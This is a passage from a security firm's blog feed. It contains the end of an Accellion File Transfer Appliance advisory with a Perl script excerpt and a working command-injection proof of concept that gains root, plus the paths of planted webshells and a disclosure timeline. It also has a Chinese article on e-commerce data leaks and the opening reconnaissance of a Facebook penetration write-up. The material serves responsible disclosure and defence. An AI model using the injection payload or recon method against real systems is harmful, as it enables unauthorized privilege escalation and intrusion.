   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cdrom=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;appid=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;servername=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;version=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;token=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/usr/bin/yum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;`;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/etc/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/home/seos/log/yum.diff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf-5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;unable to mount: $!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After taking a closer look on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ymm-client.pl&lt;/code&gt;, a Command Injection vulnerability was found on the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt;. This vulnerability enables attackers to inject any commands into the parameter and execute as root.&lt;/p&gt;

&lt;p&gt;Thus, using the commands below&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/yum-client.pl &lt;span class=&quot;nt&quot;&gt;--cdrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$(id &amp;gt; /tmp/.gg)&apos;&lt;/span&gt;

mount: can&lt;span class=&quot;s1&quot;&gt;&apos;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.

bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;will grant execution freely as root!&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;backdoor&quot;&gt;Backdoor&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
After gaining the highest privilege and carrying out server recon, we identified that several backdoors had been already planted in FTA hosts. One of them is an IRC Botnet which had been mentioned in Niara’s &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Accellion File Transfer Appliance Vulnerability&lt;/a&gt;.&lt;br /&gt;
Apart from that, two additional PHP Webshells of different types which had NEVER been noted in public reports were also identified. Through reviewing Apache Log, these backdoors might be placed by exploiting the CVE-2015-2857 vulnerability discovered in mid-2015.&lt;/p&gt;

&lt;p&gt;One of the backdoors is PHPSPY, it is found on 62 of the online hosts globally. It was placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The other is WSO, found on 9 of the online hosts globally, placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
The vulnerability mentioned in this Advisory was identified in early 2016 while looking for vulnerabilities in Facebook, you can refer to the article “&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt;”.&lt;br /&gt;
Upon discovering the FTA vulnerability in early February, I notified Facebook and Accellion and both were very responsive. Accellion responded immediately, issuing patch FTA_9_12_40 on February 12th and notifying all affected customers about the vulnerability and instructions to install the patch. Accellion has been very communicative and cooperative throughout this process.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Feb  6, 2016 05:21 Contact Accellion for vulnerability report&lt;/li&gt;
  &lt;li&gt;Feb  7, 2016 12:35 Send the report to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;Mar  3, 2016 03:03 Accellion Support Team notifies patch will be made in FTA_9_12_40&lt;/li&gt;
  &lt;li&gt;May 10, 2016 15:18 Request Advisory submission approval and report the new discovery of two backdoors to Accellion&lt;/li&gt;
  &lt;li&gt;Jun  6, 2016 10:20 Advisory finalized by mutual consent&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>電商業者的資安困境？</title>
                <description>&lt;p&gt;台灣電商網站蓬勃發展，豐富的個資、金流都吸引了攻擊者。近期刑事局 165 反詐騙網站上常看到很多電商網站面臨個資外洩的問題，新聞也不斷報導民眾因為個資外洩被詐騙集團騙取錢財。資安問題是電商業者面臨到最大的危機，民眾也很憤怒為什麼這些企業都不肯把資安做好。但我相信，電商網站的業主也是有苦難言。不少企業知道該把資安做好，有些可能不得其法，也可能什麼都做了，卻還是無法防止自己的網站出現在 165 詐騙排行的榜單上。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;內政部警政署 165 反詐騙諮詢專線 民眾通報高風險賣場排名
&lt;a href=&quot;http://165.gov.tw/loss_rank.aspx&quot;&gt;http://165.gov.tw/loss_rank.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;對於無心於資安的業者來說，被揭露這樣的資訊會有一定程度的力量迫使他們把資安做好。但對於已經顧全資安的業者來說，則是摸不著頭緒到底個資從哪邊外洩的。今天我們就來談談，到底電商網站的資安問題是什麼，民眾的個資又是怎麼外洩的。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;電商網站的困境&quot;&gt;電商網站的困境&lt;/h3&gt;

&lt;p&gt;目前電商網站常見的困境有幾點：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;自行開發網站存在漏洞&lt;/li&gt;
  &lt;li&gt;委外開發網站存在漏洞，但承包商不處理&lt;/li&gt;
  &lt;li&gt;內部員工電腦遭入侵外洩個資&lt;/li&gt;
  &lt;li&gt;配合廠商個資外洩，如金流商、物流商&lt;/li&gt;
  &lt;li&gt;攻擊者用已外洩帳號密碼登入電商網站&lt;/li&gt;
  &lt;li&gt;買家在詐騙集團的賣場交易&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;黑色產業的發展比大家想像中都還要盛行，若企業對攻擊者來說有利可圖，駭客組織會不擇手段入侵取得資料。因此對網站本身、網站周遭系統、企業內部員工、或者以社交工程手法，只要能取得資料都會是他們下手的目標。&lt;/p&gt;

&lt;h4 id=&quot;自行開發網站存在漏洞&quot;&gt;自行開發網站存在漏洞&lt;/h4&gt;

&lt;p&gt;這是目前企業最需要先解決的問題。若網站本身資安體質不好，則會輕易被攻擊者入侵。資安問題往往都是企業內部最難解的問題，道高一尺魔高一丈，若沒有經過完整的&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;滲透測試&lt;/a&gt;，則難以找出問題的根源。找到了問題之後，開發人員的教育訓練、資安機制、資安設備，都會是企業接下來要面對的課題。&lt;/p&gt;

&lt;p&gt;解決方案：滲透測試、資安顧問、教育訓練&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;委外開發網站存在漏洞但承包商不處理&quot;&gt;委外開發網站存在漏洞，但承包商不處理&lt;/h4&gt;

&lt;p&gt;不少企業沒有自己開發網站，而是發包給外部廠商開發、維運。承包商的品質通常難以掌控，價格戰的業界生態，更讓開發的品質難以提升。但業者最頭大的是：承包商拒絕處理漏洞。若沒有在一開始的委外合約就明訂資安維護標準，在日後發生資安事件時則難以要求承包商修補漏洞。因此建議業者在日後的委外開發案，明訂資安標準、驗收時檢附第三方滲透測試報告，並且將日後資安維護合約獨立於一般維護約之外，強制執行。&lt;/p&gt;

&lt;p&gt;解決方案：選商標準、開標規格、驗收標準、資安維護合約&lt;/p&gt;

&lt;h4 id=&quot;內部員工電腦遭入侵外洩個資&quot;&gt;內部員工電腦遭入侵外洩個資&lt;/h4&gt;

&lt;p&gt;除了伺服器之外，客戶端也是攻擊者下手的目標。當網站難以被入侵，攻擊者就會轉往員工電腦下手。透過社交工程、搭配惡意郵件等 APT 攻擊，入侵個人電腦後取得消費者個資，甚至做為跳板滲透企業內部擴大攻擊成果。若沒有足夠的資安意識，員工將會是企業最大的資安缺口。&lt;/p&gt;

&lt;p&gt;解決方案：強化資安思維、權限最小化、APT 防禦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;配合廠商個資外洩如金流商物流商&quot;&gt;配合廠商個資外洩，如金流商、物流商&lt;/h4&gt;

&lt;p&gt;當企業裡裡外外都防禦好了，個資還在外洩，到底發生什麼事情了呢？別忘了一個電商網站有各種與外界橋接的服務，例如交易的金流、運輸的物流。若搭配的外部系統遭到入侵，個資一樣會被取得。但民眾、媒體只會覺得「我在這家電商平台買東西被詐騙」，而怪罪到企業本身。企業有責任要求配合的廠商一同將資安、個資把關好。&lt;/p&gt;

&lt;p&gt;解決方案：配合廠商的資安規範、滲透測試&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;攻擊者用已外洩帳號密碼登入電商網站&quot;&gt;攻擊者用已外洩帳號密碼登入電商網站&lt;/h4&gt;

&lt;p&gt;資安的責任並不僅在企業，有的時候消費者本身帳號的安全也會影響到電商網站的清譽。目前民眾只要接收到詐騙電話，直覺都會是在某個店家的交易被駭，被取得資料後販售給詐騙集團，因而回報給 165 等反詐騙專線。這種案例也會算在電商網站的帳上，但卻不一定是電商網站的問題。這樣的攻擊手法也俗稱「撞庫」。&lt;/p&gt;

&lt;p&gt;解決方案：企業間的聯防、提供使用者帳號保護&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;買家在詐騙集團的賣場交易&quot;&gt;買家在詐騙集團的賣場交易&lt;/h4&gt;

&lt;p&gt;只要有利可圖，詐騙集團就會無所不用其極的想獲取利益。當系統已經達成基本的安全、使用者外洩的帳號也已經無法利用之後，詐騙集團將再攻擊人性的漏洞，開設販賣熱門商品的賣場，吸引無辜的受害者購買。或者在賣場的留言區塊假冒賣家，留下自己的 LINE 與消費者溝通，進行詐騙。&lt;/p&gt;

&lt;p&gt;解決方案：消費者安全宣導&lt;/p&gt;

&lt;h3 id=&quot;電商業者該如何自保&quot;&gt;電商業者該如何自保？&lt;/h3&gt;

&lt;p&gt;只要有利益的地方，就會有資安危機。雖說道高一尺魔高一丈，但業者並非只能等著被宰。經營網站最重要的就是保護顧客的資料，明白風險的所在。盤點手上的個資位置、機制、措施，謹慎安排資安規劃，確保將安全的風險降到最低。更進一步也可以建立與資安人員良好的關係，公開漏洞通報管道及獎勵機制，鼓勵資安人員優先通報漏洞給企業，避免流入黑色產業。當然，身為消費者的我們，也應該給予負責的企業掌聲。&lt;/p&gt;

&lt;p&gt;在未來我們的文章將提到企業應該採取的具體作為，敬請期待！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce/</link>
                <guid>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce</guid>
                <pubDate>Fri, 29 Jul 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>滲透 Facebook 的思路與發現</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;寫在故事之前&quot;&gt;寫在故事之前&lt;/h3&gt;

&lt;p&gt;身為一位滲透測試人員，比起 Client Side 的弱點我更喜歡 Server Side 的攻擊，能夠直接的控制伺服器、獲得權限操作 SHELL 才爽 &amp;lt;(￣︶￣)&amp;gt;&lt;/p&gt;

&lt;p&gt;當然一次完美的滲透任何形式的弱點都不可小覷，在實際滲透時偶爾還是需要些 Client Side 弱點組合可以更完美的控制伺服器，但是在尋找弱點時我本身還是先偏向以可直接進入伺服器的方式來去尋找風險高、能長驅直入的弱點。&lt;/p&gt;

&lt;p&gt;隨著 Facebook 在世界上越來越火紅、用戶量越來越多，一直以來都有想要嘗試看看的想法，恰巧 Facebook 在 2012 年開始有了 &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty&lt;/a&gt; 獎金獵人的機制讓我更躍躍欲試。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;一般如由滲透的角度來說習慣性都會從收集資料、偵查開始，首先界定出目標在網路上的 “範圍” 有多大，姑且可以評估一下從何處比較有機會下手。例如:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Google Hacking 到什麼資料?&lt;/li&gt;
  &lt;li&gt;用了幾個 B 段的 IP ? C 段的 IP ?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;用了什麼域名? 內部使用的域名? 接著做子域名的猜測、掃描&lt;/li&gt;
  &lt;li&gt;公司平常愛用什麼樣技術、設備?&lt;/li&gt;
  &lt;li&gt;在 Github, Pastebin 上是否有洩漏什麼資訊?&lt;/li&gt;
  &lt;li&gt;…etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;當然 Bug Bounty 並不是讓你無限制的攻擊，將所蒐集到的範圍與 Bug Bounty 所允許的範圍做交集後才是你真正可以去嘗試的目標。&lt;/p&gt;

&lt;p&gt;一般來說大公司在滲透中比較容易出現的問題點這裡舉幾個例子來探討&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;對多數大公司而言，”&lt;strong&gt;網路邊界&lt;/strong&gt;” 是比較難顧及、容易出現問題的一塊，當公司規模越大，同時擁有數千、數萬台機器在線，網管很難顧及到每台機器。在攻防裡，防守要防的是一個面，但攻擊只需找個一個點就可以突破，所以防守方相對處於弱勢，攻擊者只要找到一台位於網路邊界的機器入侵進去就可以開始在內網進行滲透了!&lt;/li&gt;
  &lt;li&gt;對於 “&lt;strong&gt;連網設備&lt;/strong&gt;” 的安全意識相對薄弱，由於連網設備通常不會提供 SHELL 給管理員做進一步的操作，只能由設備本身所提供的介面設定，所以通常對於設備的防禦都是從網路層來抵擋，但如遇到設備本身的 0-Day 或者是 1-Day 可能連被入侵了都不自覺。&lt;/li&gt;
  &lt;li&gt;人的安全，隨著 “&lt;strong&gt;社工庫&lt;/strong&gt;” 的崛起，有時可以讓一次滲透的流程變得異常簡單，從公開資料找出公司員工列表，再從社工庫找到可以登入 VPN 的員工密碼就可以開始進行內網滲透，尤其當社工庫數量越來越多 “&lt;strong&gt;量變成質變&lt;/strong&gt;” 時只要關鍵人物的密碼在社工庫中可找到，那企業的安全性就全然突破 :P
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;理所當然在尋找 Facebook 弱點時會以平常進行滲透的思路進行，在開始搜集資料時除了針對 Facebook 本身域名查詢外也對註冊信箱進行 Reverse Whois 意外發現了個奇妙的域名名稱&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW 似乎是 “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;” 的縮寫&lt;br /&gt;
再藉由公開資料發現存在下面這台這台伺服器&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;哇! vpn.tfbnw.net 看起來是個 Juniper SSL VPN 的登入介面，不過版本滿新的沒有直接可利用的弱點，不過這也成為了進入後面故事的開端。&lt;/p&gt;

&lt;p&gt;TFBNW 看似是 Facebook 內部用的域名，來掃掃 vpn.tfbnw.net 同網段看會有什麼發現&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;從這幾台機器大致可以判斷這個網段對於 Facebook 來說應該是相對重要的網段，之後一切的故事就從這裡開始。&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;弱點發現&quot;&gt;弱點發現&lt;/h3&gt;

&lt;p&gt;在同網段中，發現一台特別的伺服器&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
